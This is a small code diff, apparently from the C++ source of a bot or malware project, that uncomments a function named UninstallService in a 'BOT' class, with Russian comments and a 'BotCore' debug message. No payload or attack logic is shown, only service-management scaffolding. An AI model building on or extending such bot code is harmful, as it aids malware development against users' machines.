@@ -968,7 +968,7 @@ bool BOT::UpdateService(const char* FileName)
 // UninstallService - Функция деинсталирует
 //                    сервис бота
 //----------------------------------------------------
-/*
+
 bool BOT::UninstallService()
 {
 	COREDBG("BotCore", "Деинсталируем сервис");
@@ -992,7 +992,7 @@ bool BOT::UninstallService()
 
 	return Result;
 }
-*/
+
 
 
 
